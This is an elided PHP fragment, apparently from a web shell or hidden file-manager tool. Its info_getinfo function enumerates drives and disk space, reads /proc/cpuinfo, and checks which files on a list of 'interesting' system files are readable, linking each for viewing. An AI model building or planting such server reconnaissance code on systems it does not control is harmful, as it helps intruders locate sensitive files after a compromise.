...
if (!function_exists('info_getinfo')) {
    function info_getinfo()
    {
        ...
        if (is_win()) {
            foreach (range("A", "Z") as $letter) {
                if (is_readable($letter . ":\\")) {
                    $drive = $letter . ":";
                    $res .= "<tr><td>drive " . $drive . "</td><td>" . FileManagerClass::format_bit(@disk_free_space($drive)) . " free of " . FileManagerClass::format_bit(@disk_total_space($drive)) . "</td></tr>";
                }
            }
        } else {
            $res .= "<tr><td>root partition</td><td>" . FileManagerClass::format_bit(@disk_free_space("/")) . " free of " . FileManagerClass::format_bit(@disk_total_space("/")) . "</td></tr>";
        }
        ...
        if (!is_win()) {
            ...
            foreach ($interesting as $f) {
                if (@is_file($f) && @is_readable($f)) {
                    $res .= "<tr><td>" . $f . "</td><td><a data-path='" . urlencode(html_safe($f)) . "' onclick='view_entry(this);'>" . $f . " is readable</a></td></tr>";
                }
            }
        }
        $res .= "</table></div>";
        ...
        if (!is_win()) {
            // cpu info
            if ($i_buff = trim(FileManagerClass::get("/proc/cpuinfo"))) {
